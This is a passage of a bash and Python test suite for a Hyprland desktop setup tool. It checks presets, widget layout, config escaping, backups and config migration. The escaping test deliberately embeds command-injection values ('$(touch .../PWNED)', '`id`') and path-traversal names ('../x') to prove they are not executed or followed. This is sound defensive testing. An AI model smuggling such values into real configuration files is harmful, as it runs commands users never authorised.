        XDG_CONFIG_HOME="$dry_home/.config" \
        XDG_CACHE_HOME="$dry_home/.cache" \
        LOG_FILE="$TMP_ROOT/dry-run.log" \
            script -qec "./install.sh --dry-run" /dev/null \
                >"$dry_out" 2>&1 </dev/null || true
        # confirm() prompt: "?? <question> [Y/n]" (or [y/N] when the default is no).
        dry_prompts=$(grep -nF -e '[Y/n]' -e '[y/N]' "$dry_out" || true)
        if [[ -n "$dry_prompts" ]]; then
            fail "--dry-run asks no questions" "$dry_prompts"$'\n'
        elif ! grep -q 'Installation complete' "$dry_out"; then
            fail "--dry-run asks no questions" \
                 "--dry-run did not run to the end:"$'\n'"$(tail -5 "$dry_out")"$'\n'
        else
            pass "--dry-run asks no questions (under a pty)"
        fi
    fi

    # The default keybinding set must have no conflicts (the command returns 1 on conflict).
    if out=$(PYTHONPATH=python python3 -m hyprsetup keybinds \
                --keybinds config/keybinds.json --mod SUPER 2>&1); then
        pass "no conflicts in default keybindings"
    else
        fail "no conflicts in default keybindings" \
             "$(printf '%s\n' "$out" | grep -A1 -E 'CONFLICT|ÇAKIŞMA' || true)"$'\n'
    fi

    # Every profile preset's THEME must be defined in themes.py; otherwise
    # render silently falls back to the default palette and the preset is effectively not applied.
    bad_themes=$(PYTHONPATH=python python3 - <<'PY'
import re, sys
from pathlib import Path
from hyprsetup import themes
bad = []
for conf in sorted(Path("presets/profile").glob("*.conf")):
    m = re.search(r'^THEME="([^"]*)"', conf.read_text(encoding="utf-8"), re.M)
    # "auto" is not a real palette name: it derives colors from the wallpaper
    # (palette.py). pywal/wallust-based profiles (hyde, gdots-pywal,
    # illogical-impulse) use it.
    if m and m.group(1) not in ("", "auto") and m.group(1) not in themes.THEMES:
        bad.append(f"{conf.name}: {m.group(1)}")
print("\n".join(bad))
PY
)
    if [[ -n "$bad_themes" ]]; then
        fail "preset themes defined in themes.py" "$bad_themes"$'\n'
    else
        pass "preset themes defined in themes.py"
    fi

    # Preset values must not fall OUTSIDE the schema range. If they do, the file
    # silently lies: the settings app clamps the value when it opens the slider
    # (Gtk.Adjustment) and writes it back, so a profile saying "BLUR_SIZE=0"
    # becomes 1 on disk once applied. Bar/terminal/launcher presets follow the
    # same rule.
    bad_range=$(PYTHONPATH=python python3 - <<'RANGEEOF'
from pathlib import Path

from hyprsetup import presets as P, settings as schema

by_key = schema.by_key()
problems = []
for kind in P.KINDS:
    for path in sorted(Path(f"presets/{kind}").glob("*.conf")):
        for key, raw in P.parse(path).values.items():
            setting = by_key.get(key)
            if setting is None:
                continue
            if setting.kind in ("int", "float"):
                try:
                    value = float(raw)
                except ValueError:
                    problems.append(f"{kind}/{path.name}: {key}={raw!r} is not a number")
                    continue
                if not setting.minimum <= value <= setting.maximum:
                    problems.append(
                        f"{kind}/{path.name}: {key}={raw} out of range "
                        f"[{setting.minimum:g}, {setting.maximum:g}]")
            elif setting.kind == "choice":
                valid = [value for value, _label in setting.choices]
                if raw not in valid:
                    problems.append(f"{kind}/{path.name}: {key}={raw!r} "
                                    f"invalid — {'/'.join(valid)}")
            elif setting.kind == "bool" and raw not in ("true", "false"):
                problems.append(f"{kind}/{path.name}: {key}={raw!r} is not a bool")
print("\n".join(problems))
RANGEEOF
)
    if [[ -n "$bad_range" ]]; then
        fail "preset values within schema range" "$bad_range"$'\n'
    else
        pass "preset values within schema range"
    fi

    # Widgets: do the catalog ↔ both templates ↔ preset files see the same list,
    # and does the computed layout OVERLAP?
    #
    # History: widget positions were hand-written in the template, and while the
    # catalog had 15 widgets eww recognized only 6 of them — a widget enabled in
    # the UI was silently never generated. Never let the three sources drift
    # silently again.
    widget_out=$(PYTHONPATH="$SETUP_ROOT/python" python3 - <<'WIDGETEOF'
from pathlib import Path
from hyprsetup import render as R

problems = []
eww = Path("templates/eww/eww.yuck.tmpl").read_text()
qml = Path("templates/quickshell/shell.qml.tmpl").read_text()
presets = {p.stem for p in Path("presets/widget").glob("*.conf")}

for name, spec in R.WIDGET_CATALOG.items():
    flag = R.widget_flag(name)
    if name not in presets:
        problems.append(f"{name}: presets/widget/{name}.conf missing")
    if "eww" in spec.engines and f"{{{{#if HAS_WIDGET_{flag}}}}}" not in eww:
        problems.append(f"{name}: no HAS_WIDGET_{flag} block in the eww template")
    if "quickshell" in spec.engines and f"{{{{#if HAS_QS_WIDGET_{flag}}}}}" not in qml:
        problems.append(f"{name}: no HAS_QS_WIDGET_{flag} in the quickshell template")
    if spec.zone not in R.WIDGET_ZONES:
        problems.append(f"{name}: invalid corner {spec.zone!r}")

for name in sorted(presets - set(R.WIDGET_CATALOG)):
    problems.append(f"{name}: preset exists but not in WIDGET_CATALOG")

# With all enabled, no box may overlap another.
values = {"WIDGETS": ",".join(R.WIDGET_CATALOG),
          "BAR_POSITION": "top", "BAR_HEIGHT": "38", "BAR_MARGIN": "6"}
selected = ["audio-tools", "networkmanager", "brightness"]
for engine in ("eww", "quickshell"):
    boxes = R.widget_layout(values, selected, engine)
    if len(boxes) != len(R.WIDGET_CATALOG):
        problems.append(f"{engine}: {len(boxes)}/{len(R.WIDGET_CATALOG)} widgets placed")
    for zone in R.WIDGET_ZONES:
        spans = sorted((b["y"], b["y"] + b["height"], b["name"])
                       for b in boxes if b["zone"] == zone)
        for (_s1, e1, n1), (s2, _e2, n2) in zip(spans, spans[1:]):
            if s2 < e1:
                problems.append(f"{engine}/{zone}: {n1} and {n2} overlap")
    # Top corners must start below the bar (38 + 6 = 44).
    for box in boxes:
        if box["v_edge"] == "top" and box["y"] < 44:
            problems.append(f"{engine}: {box['name']} sits under the bar "
                            f"(y={box['y']})")
            break
print("\n".join(problems))
WIDGETEOF
)
    if [[ -n "$widget_out" ]]; then
        fail "widget catalog ↔ templates ↔ layout" "$widget_out"$'\n'
    else
        pass "widget catalog ↔ templates ↔ layout ($(PYTHONPATH="$SETUP_ROOT/python" python3 -c 'from hyprsetup import render; print(len(render.WIDGET_CATALOG))') widgets × 2 engines)"
    fi

    # Widget VISIBILITY: layer, autostart and the toggle shortcut.
    #
    # This was the real problem: widgets were drawn on the "bottom" layer, i.e.
    # UNDER windows. On a tiling desktop the screen is almost always covered,
    # so widgets were practically never visible — "I enabled it but nothing
    # shows". Now the layer is configurable and MOD+SHIFT+W toggles them on and
    # off.
    widget_vis=$(PYTHONPATH="$SETUP_ROOT/python" python3 - <<'VISEOF'
from pathlib import Path

from hyprsetup import keybinds as keybinds_mod, render
from hyprsetup.catalog import Catalog

catalog = Catalog.load("config/components.json")
problems = []

base = {
    "MANAGE_HYPR_CONFIGS": "1", "HYPR_LANG": "conf", "WIDGET_ENGINE": "eww",
    "WIDGETS": "clock,music", "HAS_EWW": "1", "BAR": "waybar",
}
selected = ["hyprland", "eww", "audio-tools"]

for layer, want_eww, want_qml in (("bottom", "bt", "WlrLayer.Bottom"),
                                  ("top", "fg", "WlrLayer.Top"),
                                  ("", "bt", "WlrLayer.Bottom")):
    out = render.derived_vars({**base, "WIDGET_LAYER": layer}, catalog, selected)
    if out["WIDGET_STACKING_EWW"] != want_eww:
        problems.append(f"WIDGET_LAYER={layer!r}: eww {out['WIDGET_STACKING_EWW']}, expected {want_eww}")
    if out["WIDGET_LAYER_QML"] != want_qml:
        problems.append(f"WIDGET_LAYER={layer!r}: qml {out['WIDGET_LAYER_QML']}, expected {want_qml}")

# A connector name (DP-1) does NOT WORK in eww; it expects a number.
out = render.derived_vars({**base, "WIDGET_MONITOR": "1"}, catalog, selected)
if out["WIDGET_MONITOR_EWW"] != "1":
    problems.append(f"WIDGET_MONITOR=1 -> {out['WIDGET_MONITOR_EWW']}")

# widgets.sh must carry the widget names actually generated.
out = render.derived_vars(base, catalog, selected)
names = out["WIDGET_NAMES"].split()
if sorted(names) != ["clock", "music"]:
    problems.append(f"WIDGET_NAMES: {names}")

# Autostart: showing at startup must be switchable off.
for autostart, want in (("true", True), ("false", False)):
    lines = render.derived_vars({**base, "WIDGET_AUTOSTART": autostart},
                                catalog, selected)["AUTOSTART_LINES"]
    has = "widgets.sh show" in lines
    if has is not want:
        problems.append(f"WIDGET_AUTOSTART={autostart}: widgets.sh show {'present' if has else 'missing'}")
    if "eww daemon" not in lines:
        problems.append(f"WIDGET_AUTOSTART={autostart}: eww daemon line missing")
    if "eww open " in lines:
        problems.append("still generating an 'eww open' line per widget")

# The toggle shortcut must be generated when eww is installed.
binds = keybinds_mod.Keybinds.load("config/keybinds.json")
resolved = keybinds_mod.resolve(binds, {"HAS_EWW": "1"})
if not any(b.id == "widgets-toggle" for b in resolved):
    problems.append("widgets-toggle keybinding not generated")
if any(b.id == "widgets-toggle" for b in keybinds_mod.resolve(binds, {})):
    problems.append("widgets-toggle keybinding generated without eww")

# Box sizes must not overlap (when the workspace box was declared smaller
# than its real height it overlapped the calendar).
layout = render.widget_layout(
    {"WIDGETS": "workspace,calendar", "WIDGET_ZONE_TL": "workspace,calendar",
     "BAR_POSITION": "top", "BAR_HEIGHT": "38", "BAR_MARGIN": "6"},
    ["eww"], "eww")
boxes = sorted(((int(i["y"]), int(i["height"]), i["name"]) for i in layout))
for (y1, h1, n1), (y2, _h2, n2) in zip(boxes, boxes[1:]):
    if y1 + h1 > y2:
        problems.append(f"{n1} and {n2} overlap ({y1}+{h1} > {y2})")

# Center positions are centered horizontally (not anchored to the left/right edge)
# and a per-widget offset also pushes the following ones in the stack; x is not applied in the center.
layout = render.widget_layout(
    {"WIDGETS": "clock,battery,disk", "WIDGET_ZONE_TC": "clock,battery",
     "WIDGET_ZONE_BL": "disk", "BAR_POSITION": "top", "BAR_HEIGHT": "38",
     "BAR_MARGIN": "6", "WIDGET_MARGIN": "16", "WIDGET_GAP": "10",
     "WIDGET_OFFSETS": "clock:50:20,disk:30:-6,bogus,x:y:z"},
    ["eww"], "eww")
by = {i["name"]: i for i in layout}
if by["clock"]["h_edge"] != "center" or by["clock"]["x"] != 0:
    problems.append(f"top center: {by['clock']}")
if by["clock"]["y"] != 16 + 44 + 20:
    problems.append(f"top center y offset: {by['clock']['y']}")
if by["battery"]["y"] != by["clock"]["y"] + by["clock"]["height"] + 10:
    problems.append("vertical offset does not push the widget below")
if (by["disk"]["x"], by["disk"]["y"]) != (46, 10):
    problems.append(f"bottom left offset: {by['disk']['x']},{by['disk']['y']}")
out = render.derived_vars({**base, "WIDGETS": "clock",
                           "WIDGET_ZONE_TC": "clock"}, catalog, selected)
if out["WG_CLOCK_ANCHOR"] != "top center" or out["WG_CLOCK_LEFT"] != "false" \
        or out["WG_CLOCK_RIGHT"] != "false":
    problems.append(f"top center anchor: {out['WG_CLOCK_ANCHOR']}")
# "I applied it but it doesn't work": a widget set / toggle must also select the
# engine, and eww windows must be reopened when the widget list (widgets.sh) changes.
from pathlib import Path as _P
from hyprsetup import apply as apply_mod
from hyprsetup.gui.state import SetupState
state = SetupState(catalog)
for comp in ("eww", "quickshell"):
    state.selected.discard(comp)
state.apply_widget_set(_P("."), "laptop")
if not state.primary("widget"):
    problems.append("applying a widget set does not select a widget engine")
for comp in ("eww", "quickshell"):
    state.selected.discard(comp)
state.values["WIDGETS"] = ""
state.set_widget_enabled(_P("."), "clock", True)
if state.widgets() != ["clock"] or not state.primary("widget"):
    problems.append(f"toggle: WIDGETS={state.widgets()} engine={state.primary('widget')!r}")
state.set_widget_enabled(_P("."), "clock", False)
if state.widgets():
    problems.append("turning the toggle off does not remove the widget from the list")
# Dependency check (deps.py): every "requires" in the schema must point to a real
# component or pkg:<package>; a typo would silently disable the
# check.
from hyprsetup import deps as deps_mod, settings as schema_mod
for group in schema_mod.GROUPS:
    for setting in group.settings:
        for value, needed in setting.requires.items():
            if setting.kind == "choice" and value not in (deps_mod.ANY_VALUE,) \
                    and value not in [c[0] for c in setting.choices]:
                problems.append(f"{setting.key}: choice {value!r} in requires does not exist")
            for dep in needed:
                if not dep.startswith(deps_mod.PKG_PREFIX) and catalog.component(dep) is None:
                    problems.append(f"{setting.key}: unknown component {dep!r}")
for name, spec in render.WIDGET_CATALOG.items():
    if spec.requires and catalog.component(spec.requires) is None:
        problems.append(f"widget {name}: unknown component {spec.requires!r}")
if deps_mod.triggered({"true": ("x",)}, "false") or \
        deps_mod.triggered({"*": ("x",)}, "") or \
        deps_mod.triggered({"*": ("x",)}, "crt") != ("x",) or \
        deps_mod.triggered({"matugen": ("m",)}, "python"):
    problems.append("deps.triggered fires incorrectly")
everything = {p for cat in catalog.categories for c in cat.components
              for p in list(c.repo) + list(c.aur)}
got = deps_mod.unmet(["audio-tools", "pkg:flatpak", "waybar"], catalog,
                     ["waybar"], everything - {"pamixer"})
if [(u.dep, u.packages, u.only_unselected) for u in got] != [
        ("audio-tools", ["pamixer"], False), ("pkg:flatpak", ["flatpak"], False)]:
    problems.append(f"deps.unmet: {[(u.dep, u.packages) for u in got]}")
got = deps_mod.unmet(["swww"], catalog, ["hyprpaper"], everything)
if not got or not got[0].only_unselected or not got[0].replaces:
    problems.append("no replacement prompt in a single-choice category")
# If pacman could not be read (empty set) only the selection is checked.
if deps_mod.unmet(["waybar"], catalog, ["waybar"], set()):
    problems.append("selected component counted as missing without pacman")

if apply_mod.action_for("hypr/scripts/widgets.sh") != "eww":
    problems.append("eww windows are not refreshed when widgets.sh changes")

if render.format_widget_offsets(render.widget_offsets(
        {"WIDGET_OFFSETS": "clock:0:0,disk:5:-5"})) != "disk:5:-5":
    problems.append("WIDGET_OFFSETS round trip broken")

print("\n".join(problems))
VISEOF
)
    if [[ -n "$widget_vis" ]]; then
        fail "widget visibility: layer, autostart, toggle" "$widget_vis"$'\n'
    else
        pass "widget visibility: layer, autostart, toggle"
    fi

    # Are the widget set presets (presets/widget-set/) consistent?
    # If a set enables a nonexistent widget or puts a name not in WIDGETS into a
    # corner, the user applies the set and sees nothing on the desktop —
    # and no error either, because render silently skips unknown names.
    wset_out=$(PYTHONPATH="$SETUP_ROOT/python" python3 - <<'WSETEOF'
from pathlib import Path

from hyprsetup import presets as presets_mod
from hyprsetup.render import WIDGET_CATALOG, WIDGET_ZONES

problems = []
sets = presets_mod.load_all(presets_mod.default_dir(Path("."), "widget-set"))
if not sets:
    problems.append("presets/widget-set/ is empty")

for preset in sets:
    widgets = presets_mod.split_widgets(preset.values.get("WIDGETS", ""))
    if not widgets:
        problems.append(f"{preset.name}: WIDGETS is empty")
    unknown = [w for w in widgets if w not in WIDGET_CATALOG]
    if unknown:
        problems.append(f"{preset.name}: widget not in catalog: {unknown}")
    if len(set(widgets)) != len(widgets):
        problems.append(f"{preset.name}: duplicate name in WIDGETS")

    placed = []
    for zone in WIDGET_ZONES:
        names = presets_mod.split_widgets(
            preset.values.get(f"WIDGET_ZONE_{zone}", ""))
        outside = [w for w in names if w not in widgets]
        if outside:
            problems.append(
                f"{preset.name}: widget not enabled in corner {zone}: {outside}")
        placed += names
    # A widget without a corner falls back to the catalog default; that may be
    # deliberate, but if the whole set has no corners there is no layout.
    if widgets and not placed:
        problems.append(f"{preset.name}: no corners defined")
    if not (preset.title and preset.desc):
        problems.append(f"{preset.name}: title/desc header missing")

print("\n".join(problems))
WSETEOF
)
    if [[ -n "$wset_out" ]]; then
        fail "widget set presets consistent" "$wset_out"$'\n'
    else
        pass "widget set presets consistent ($(find presets/widget-set -name '*.conf' | wc -l) sets)"
    fi

    # Are the widget STYLE presets (presets/widget-style/) consistent? A style
    # owns exactly the look keys (presets.WIDGET_STYLE_KEYS): a missing key
    # would leak the previous style's value, an unknown choice would silently
    # fall back to the default, and a set must not write look keys any more.
    wstyle_out=$(PYTHONPATH="$SETUP_ROOT/python" python3 - <<'WSTYLEEOF'
from pathlib import Path

from hyprsetup import presets as presets_mod
from hyprsetup.render import WIDGET_LOOK_CHOICES, WIDGET_LOOK_DEFAULTS

problems = []
keys = set(presets_mod.WIDGET_STYLE_KEYS)
if keys != set(WIDGET_LOOK_DEFAULTS):
    problems.append("presets.WIDGET_STYLE_KEYS != render.WIDGET_LOOK_DEFAULTS")
styles = presets_mod.load_all(presets_mod.default_dir(Path("."), "widget-style"))
if not styles:
    problems.append("presets/widget-style/ is empty")
for preset in styles:
    given = set(preset.values)
    if given != keys:
        problems.append(f"{preset.name}: missing {sorted(keys - given)}, "
                        f"extra {sorted(given - keys)}")
    for key, choices in WIDGET_LOOK_CHOICES.items():
        if preset.values.get(key) not in choices:
            problems.append(f"{preset.name}: {key}={preset.values.get(key)!r} "
                            f"not in {choices}")
    if not (preset.title and preset.desc):
        problems.append(f"{preset.name}: title/desc header missing")
for preset in presets_mod.load_all(presets_mod.default_dir(Path("."), "widget-set")):
    leaked = sorted(keys & set(preset.values))
    if leaked:
        problems.append(f"widget-set {preset.name}: look keys belong to a style: {leaked}")
print("\n".join(problems))
WSTYLEEOF
)
    if [[ -n "$wstyle_out" ]]; then
        fail "widget style presets consistent" "$wstyle_out"$'\n'
    else
        pass "widget style presets consistent ($(find presets/widget-style -name '*.conf' | wc -l) styles)"
    fi

    # Writing/reading settings.conf. Values used to be written unescaped as
    # KEY="value" and the file was sourced: a value containing quotes/$ (a
    # custom module command) was EXECUTED on read. The Python writer + bash
    # reader (and vice versa) must yield the same value; the old format must not run code.
    conf_tmp=$(mktemp -d)
    conf_out=$(CONF_TMP="$conf_tmp" PYTHONPATH=python python3 - <<'CONFEOF'
import os, subprocess
from pathlib import Path
from hyprsetup import conffile
tmp = Path(os.environ["CONF_TMP"])
values = ["plain", "", "Ali's", 'echo "CPU $(cat /proc/loadavg | cut -d" " -f1)"',
          "back\\slash", "it's \"$x\"", "`id`", "a  b"]
problems = []
(tmp / "py.conf").write_text("".join(conffile.line(f"V{i}", v) + "\n"
                                     for i, v in enumerate(values)))
script = f"""
set -euo pipefail
SETUP_ROOT=$PWD; source lib/core.sh >/dev/null 2>&1; source lib/config.sh
_conf_read {tmp}/py.conf
for i in {' '.join(str(i) for i in range(len(values)))}; do v=V$i; printf '%s\\0' "${{!v}}"; done
{{ for i in {' '.join(str(i) for i in range(len(values)))}; do v=V$i; printf 'V%s=%s\\n' "$i" "$(_conf_quote "${{!v}}")"; done; }} > {tmp}/bash.conf
printf 'LEG="echo "x" $(touch {tmp}/PWNED)"\\nHOMEP="$HOME/p"\\n' > {tmp}/legacy.conf
_conf_read {tmp}/legacy.conf
printf '%s\\0%s\\0' "$LEG" "$HOMEP"
"""
# The writer's output must also be correct as shell: any tool that sources
# the file directly (including the old install.sh) must get the same values
# and no command may run.
sourced = subprocess.run(
    ["bash", "-c", f"source {tmp}/py.conf; for i in "
     + " ".join(str(i) for i in range(len(values)))
     + "; do v=V$i; printf '%s\\0' \"${!v}\"; done"],
    capture_output=True, text=True)
if sourced.stdout.split("\0")[:len(values)] != values:
    problems.append("file written by python gets corrupted when sourced "
                    "(missing escaping)")
out = subprocess.run(["bash", "-c", script], capture_output=True, text=True,
                     env={**os.environ, "LOG_FILE": str(tmp / "log")})
got = out.stdout.split("\0")
if got[:len(values)] != values:
    problems.append(f"python wrote → bash read: {got[:len(values)]!r}")
back = conffile.parse_file(tmp / "bash.conf")
if [back.get(f"V{i}") for i in range(len(values))] != values:
    problems.append("bash wrote → python read differs")
if (tmp / "PWNED").exists():
    problems.append("a COMMAND RAN while reading an old-format file")
if len(got) > len(values) + 1 and got[len(values) + 1] != os.environ["HOME"] + "/p":
    problems.append(f"$HOME not expanded in old format: {got[len(values) + 1]!r}")
if out.returncode:
    problems.append(f"bash exit {out.returncode}: {out.stderr[-300:]}")
print("\n".join(problems))
CONFEOF
)
    rm -rf "$conf_tmp"
    if [[ -n "$conf_out" ]]; then
        fail "settings.conf escaping (python ↔ bash, old format)" "$conf_out"$'\n'
    else
        pass "settings.conf escaping (python ↔ bash, old format)"
    fi

    # Installed-package detection must count "provides" (awww → swww, mesa →
    # libva-mesa-driver); backups must be pruned and their kinds read correctly.
    misc_out=$(PYTHONPATH=python python3 - <<'MISCEOF'
import tempfile
from pathlib import Path
from hyprsetup import apply as apply_mod, backups
problems = []
sample = """Name            : mesa
Version         : 1
Provides        : libva-mesa-driver=1:26.2  mesa-libgl=1:26
                  opengl-driver
Depends On      : glibc

Name            : awww
Provides        : swww
"""
got = apply_mod._parse_installed(sample)
for want in ("mesa", "libva-mesa-driver", "mesa-libgl", "opengl-driver", "awww", "swww"):
    if want not in got:
        problems.append(f"provides parsing: {want} missing")
if "glibc" in got or "1" in got:
    problems.append(f"provides parsing extras: {sorted(got)}")
with tempfile.TemporaryDirectory() as tmp:
    base = Path(tmp)
    names = [f"2026010{i}-000000" for i in range(1, 10)] + [f"2026011{i}-000000" for i in range(10)]
    for i, name in enumerate(names):
        d = base / name
        d.mkdir()
        if i == 0:
            (d / "_manifest.txt").write_text("x")          # old install backup
        else:
            backups.mark(d, "install" if i % 4 == 0 else "live")
    removed = backups.prune(base, keep_install=2, keep_live=3)
    left = sorted(p.name for p in base.iterdir())
    if names[0] not in left:
        problems.append("the first (original) backup was pruned")
    kinds = [backups.kind_of(base / n) for n in left[1:]]
    if kinds.count("install") != 2 or kinds.count("live") != 3:
        problems.append(f"after pruning: {list(zip(left, [backups.kind_of(base / n) for n in left]))}")
print("\n".join(problems))
MISCEOF
)
    if [[ -n "$misc_out" ]]; then
        fail "package detection (provides) + backup pruning" "$misc_out"$'\n'
    else
        pass "package detection (provides) + backup pruning"
    fi

    # restore.sh: the default target is the latest INSTALL backup (not a live one),
    # files created by that install are deleted, bookkeeping files are not copied home.
    rs_home=$(mktemp -d)
    rs_b="$rs_home/.config/hyprsetup-backups"
    mkdir -p "$rs_b/20260101-000000/.config/app" "$rs_b/20260102-000000/.config/app" \
             "$rs_b/20260103-000000/.config/app" "$rs_home/.config/app"
    echo orig >"$rs_b/20260101-000000/.config/app/a.conf"
    echo x >"$rs_b/20260101-000000/_manifest.txt"
    echo inst >"$rs_b/20260102-000000/.config/app/a.conf"
    echo install >"$rs_b/20260102-000000/_kind"
    echo "$rs_home/.config/app/new.conf" >"$rs_b/20260102-000000/_created.txt"
    echo live >"$rs_b/20260103-000000/.config/app/a.conf"
    echo live >"$rs_b/20260103-000000/_kind"
    echo cur >"$rs_home/.config/app/a.conf"
    echo new >"$rs_home/.config/app/new.conf"
    HOME="$rs_home" LOG_FILE="$rs_home/log" ./restore.sh -y >/dev/null 2>&1 || true
    rs_problems=""
    [[ "$(cat "$rs_home/.config/app/a.conf")" == inst ]] || rs_problems+="default target is not the latest install backup; "
    [[ -e "$rs_home/.config/app/new.conf" ]] && rs_problems+="file created by the install was not deleted; "
    [[ -e "$rs_home/_kind" || -e "$rs_home/_created.txt" ]] && rs_problems+="backup bookkeeping files were copied home; "
    HOME="$rs_home" LOG_FILE="$rs_home/log" ./restore.sh -y --first >/dev/null 2>&1 || true
    [[ "$(cat "$rs_home/.config/app/a.conf")" == orig ]] || rs_problems+="--first did not restore the original state; "
    rm -rf "$rs_home"
    if [[ -n "$rs_problems" ]]; then
        fail "restore.sh target selection and cleanup" "$rs_problems"
    else
        pass "restore.sh target selection and cleanup"
    fi

    # Every repo package in the catalog must really exist in a repo. Arch renames
    # packages (hyprland-qtutils → hyprland-guiutils, swww → awww, p7zip →
    # 7zip…); when the old name stayed, the installer could not install that
    # package and the component looked "not installed" forever.
    if command -v pacman >/dev/null 2>&1 && pacman -Si pacman >/dev/null 2>&1; then
        repo_missing=()
        while IFS= read -r pkg; do
            [[ -n "$pkg" ]] || continue
            pacman -Si "$pkg" >/dev/null 2>&1 || repo_missing+=("$pkg")
        done < <(jq -r '.categories[].components[].repo[]?' config/components.json | sort -u)
        if ((${#repo_missing[@]})); then
            fail "catalog repo packages exist in repos" "missing: ${repo_missing[*]}"
        else
            pass "catalog repo packages exist in repos"
        fi
    else
        skip "catalog repo packages exist in repos" "no pacman sync database"
    fi

    # The bar/terminal/launcher presets and wallpaper a profile points to must
    # really exist; otherwise the profile is silently applied incompletely (e.g.
    # BAR_PRESET="none" → the bar is drawn with the default sizes, not the profile's).
    bad_refs=$(PYTHONPATH=python python3 - <<'REFEOF'
from pathlib import Path

from hyprsetup import presets as P

pools = {kind: {path.stem for path in Path(f"presets/{kind}").glob("*.conf")}
         for kind in ("bar", "terminal", "launcher", "widget")}
problems = []
for path in sorted(Path("presets/profile").glob("*.conf")):
    values = P.parse(path).values
    for key, kind in (("BAR_PRESET", "bar"), ("TERM_PRESET", "terminal"),
                      ("LAUNCHER_PRESET", "launcher")):
        name = values.get(key, "")
        if name and P.canonical(name, kind) not in pools[kind]:
            problems.append(f"{path.name}: {key}={name} — not in presets/{kind}/")
    for widget in P.split_widgets(values.get("WIDGETS", "")):
        if widget not in pools["widget"]:
            problems.append(f"{path.name}: WIDGETS={widget} — not in presets/widget/")
    image = values.get("WALLPAPER_IMAGE", "")
    if image and not Path(image).is_file():
        problems.append(f"{path.name}: WALLPAPER_IMAGE={image} missing")
print("\n".join(problems))
REFEOF
)
    if [[ -n "$bad_refs" ]]; then
        fail "presets referenced by profiles exist" "$bad_refs"$'\n'
    else
        pass "presets referenced by profiles exist"
    fi

    # Profile look variants (presets/profile/<name>.variants/<look>.conf):
    # a variant writes ON TOP of the profile; if none is given the profile's
    # PROFILE_VARIANT default is used, an unknown name falls back to the profile
    # itself; the bash chain (lib/preset.sh) and the Python chain (presets.resolve_chain)
    # must agree. Independent of real profiles: a temporary root is set up.
    var_root=$(mktemp -d)
    mkdir -p "$var_root/presets/profile/demo.variants" "$var_root/presets/bar"
    printf 'THEME="nord"\nGAPS_IN=7\nPROFILE_VARIANT="day"\n' >"$var_root/presets/profile/demo.conf"
    printf '#  title: Day\nTHEME="rose-pine-dawn"\nWALLPAPER_IMAGE="wallpapers/a.png"\n' >"$var_root/presets/profile/demo.variants/day.conf"
    printf '#  title: Night\nTHEME="tokyo-night"\n' >"$var_root/presets/profile/demo.variants/night.conf"
    var_out=$(VAR_ROOT="$var_root" PYTHONPATH=python python3 - <<'VAREOF'
import os, subprocess
from pathlib import Path
from hyprsetup import presets as P
root = Path(os.environ["VAR_ROOT"]); problems = []
def py(variant=""):
    v = P.resolve_chain(root, profile="demo", variant=variant)
    return v.get("THEME"), v.get("GAPS_IN"), v.get("PROFILE_VARIANT", "")
def sh(variant=""):
    script = f"""
set -euo pipefail
SETUP_ROOT=$PWD; source lib/core.sh >/dev/null 2>&1
PRESET_ROOT={root}/presets; PRESET_DIR={root}/presets/profile
source lib/preset.sh
declare -a CONFIG_VARS=(THEME GAPS_IN WALLPAPER_IMAGE)
PRESET=demo; {"PROFILE_VARIANT=" + variant if variant else ""}
preset_apply_chain >/dev/null 2>&1
printf '%s|%s|%s' "$THEME" "$GAPS_IN" "${{PROFILE_VARIANT:-}}"
"""
    out = subprocess.run(["bash", "-c", script], capture_output=True, text=True,
                         env={**os.environ, "LOG_FILE": str(root / "log")})
    return tuple(out.stdout.split("|")) if out.stdout else ("?", out.stderr[-200:], "")
for variant, want in (("", ("rose-pine-dawn", "7", "day")),
                      ("night", ("tokyo-night", "7", "night"))):
    if py(variant) != want:
        problems.append(f"python variant={variant!r}: {py(variant)} != {want}")
    if sh(variant) != want:
        problems.append(f"bash variant={variant!r}: {sh(variant)} != {want}")
if py("missing")[0] != "nord":
    problems.append(f"unknown variant did not fall back to the profile: {py('missing')}")
if [v.label for v in P.load_variants(root, "demo")] != ["Day", "Night"]:
    problems.append(f"variant list: {[v.label for v in P.load_variants(root, 'demo')]}")
if [p.name for p in P.load_all(root / "presets/profile")] != ["demo"]:
    problems.append("variant files leaked into the profile list")
if P.load_variants(root, "../x") or P.find_variant(root, "demo", "../day"):
    problems.append("variant name can escape the directory")
print("\n".join(problems))
VAREOF
)
    rm -rf "$var_root"
    if [[ -n "$var_out" ]]; then
        fail "profile look variants (python ↔ bash)" "$var_out"$'\n'
    else
        pass "profile look variants (python ↔ bash)"
    fi

    # Profiles (rice.py) — offline: with a temporary local git repo and a fake
    # manifest, install → ownership → live-apply skip → uninstall.
    # An old-syntax hyprland.conf must be converted to current syntax (hyprmigrate)
    # and, if Hyprland is installed, pass the validator.
    rice_out=$(PYTHONPATH=python python3 - <<'RICEEOF'
import os, shutil, subprocess, tempfile
from pathlib import Path
from hyprsetup import hyprmigrate, rice, presets as P
problems = []

old = """general {
    gaps_in = 3
}
decoration {
    rounding = 6
    shadow {
        ignore_window = true
    }
}
gestures {
    workspace_swipe = true
}
windowrulev2 = float, class:^(pavucontrol)$
windowrulev2 = workspace 2 silent, class:kitty, title:^(nvim)$
windowrulev2 = noblur, xwayland:1
windowrule = float, ^(mpv)$
layerrule = blur, waybar
layerrule = ignorezero, rofi
"""
new, rep = hyprmigrate.migrate(old)
for want in ("windowrule = float on, match:class ^(pavucontrol)$",
             "windowrule = workspace 2 silent, match:class kitty, match:title ^(nvim)$",
             "windowrule = no_blur on, match:xwayland 1",
             "windowrule = float on, match:class ^(mpv)$",
             "layerrule = blur on, match:namespace waybar",
             "layerrule = ignore_alpha 0, match:namespace rofi",
             "gesture = 3, horizontal, workspace", "rounding = 6"):
    if want not in new:
        problems.append(f"hyprmigrate: '{want}' missing")
if "windowrulev2 =" in new or "\n        ignore_window" in new:
    problems.append("hyprmigrate: an old line remained")
from hyprsetup.apply import Applier as _HyprApplier
from hyprsetup.catalog import Catalog as _HyprCatalog
_hypr_verify_conf = (bool(shutil.which("Hyprland"))
                     and _HyprApplier(Path("."), _HyprCatalog.load("config/components.json"))
                     .resolve_hypr_lang("auto") == "conf")
if _hypr_verify_conf:
    with tempfile.TemporaryDirectory() as t:
        conf = Path(t) / "h.conf"; conf.write_text(new)
        out = subprocess.run(["Hyprland", "--verify-config", "-c", str(conf)],
                             capture_output=True, text=True, timeout=60,
                             env={**{k: v for k, v in os.environ.items()
                                     if k not in rice._SESSION_VARS},
                                  "HOME": t, "XDG_RUNTIME_DIR": t})
